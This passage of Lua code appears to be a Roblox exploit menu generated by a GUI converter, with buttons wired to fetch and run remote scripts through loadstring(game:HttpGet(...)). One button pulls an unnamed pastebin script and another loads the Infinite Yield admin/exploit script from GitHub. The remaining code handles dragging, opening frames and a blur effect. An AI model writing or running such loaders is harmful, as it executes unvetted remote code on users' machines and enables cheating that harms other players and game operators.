	script.Parent.MouseButton1Click:connect(function()
		loadstring(game:HttpGet("https://pastebin.com/raw/XwQciZ4y", true))()
	end)
end
coroutine.wrap(GOKJZET_fake_script)()
local function CICIE_fake_script()
	local script = Instance.new('LocalScript', IY)

	script.Parent.MouseButton1Click:connect(function()
		loadstring(game:HttpGet(('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'),true))()
	end)
end
coroutine.wrap(CICIE_fake_script)()
local function HCBHN_fake_script()
	local script = Instance.new('LocalScript', Open)

	script.Parent.Draggable = true
	
	script.Parent.MouseButton1Click:connect(function()
		script.Parent.Visible = false
		script.Parent.Parent.MainFrame.Visible = true
	end)
end
coroutine.wrap(HCBHN_fake_script)()
local function CHPU_fake_script()
	local script = Instance.new('LocalScript', AmBonaGUI)

	local blur = Instance.new("BlurEffect", game.Lighting)
	blur.Size = 12
	blur.Enabled = false
	
	script.Parent.Open.MouseButton1Click:connect(function()
		blur.Enabled = true
	end)
	
	script.Parent.MainFrame.Frame.CloseButton.MouseButton1Click:connect(function()
		blur.Enabled = false
	end)
end
coroutine.wrap(CHPU_fake_script)()
